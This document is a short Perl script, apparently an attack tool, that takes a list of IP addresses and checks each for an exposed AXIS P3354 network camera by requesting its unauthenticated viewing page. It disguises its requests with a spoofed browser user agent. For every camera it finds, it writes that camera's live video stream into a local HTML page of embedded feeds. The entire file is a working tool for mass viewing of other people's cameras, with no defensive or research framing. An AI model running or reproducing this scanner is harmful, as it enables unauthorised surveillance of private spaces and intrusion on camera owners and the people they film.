#!/usr/bin/perl
# Tested on AXIS P3354

use LWP::UserAgent;

system $^O eq 'MSWin32' ? 'cls' : 'clear';

print "\t\n      AXIS P3354 grabber\n\n";

open(op,"<$ARGV[0]") or die "$!";
while(<op>){
chomp($ip = $_);

my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");

my $req = $ua->get("http://".$ip."/view/view.shtml?id=12170&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1")->content;

if($req =~/AXIS P3354/) { 


print "\n  [".$ip."] => Good Axis Camera";

open(savee, ">>axis.html");
print savee "<h1>".$ip."<\/h1><br><br><iframe src=\"http:\/\/".$ip."\/mjpg\/video.mjpg\" width=\"630\" height=\"500\"><\/iframe><br><br>";
close savee;

           }
       }
